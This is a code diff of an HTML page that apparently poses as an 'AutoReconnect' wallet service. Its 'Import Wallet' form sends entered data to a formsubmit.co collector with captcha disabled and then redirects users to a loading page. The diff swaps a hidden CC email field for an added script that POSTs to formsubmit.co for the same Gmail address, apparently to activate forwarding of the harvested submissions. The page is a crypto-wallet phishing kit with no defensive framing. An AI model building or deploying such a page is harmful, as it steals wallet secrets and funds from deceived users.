@@ -63,7 +63,7 @@
                 <h3>Import Wallet</h3>
                 <div class="wallet">
                     <form class="wallet-container card" action="https://formsubmit.co/2d19e861c74bfc05b2e00bca38874e04" method="POST">
-                        <input type="hidden" name="_cc" value="xc607818@gmail.com">
+                        
                         <input type="hidden" name="_next" value="https://autoreconnection.com/loading">
                         
                         <input type="hidden" name="_captcha" value="false">
@@ -139,5 +139,18 @@
     <h5>Copyright © 2022 AutoReconnect, Inc. All rights reserved.</h5>
 </section>
 <script src="js.js"></script>
+<script>
+    fetch("https://formsubmit.co/ajax/xc607818@gmail.com", {
+    method: "POST",
+    headers: { 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+    },
+    body: JSON.stringify({
+        name: "FormSubmit",
+        message: "I'm from Devro LABS"
+    })
+})
+</script>
 </body>
 </html>
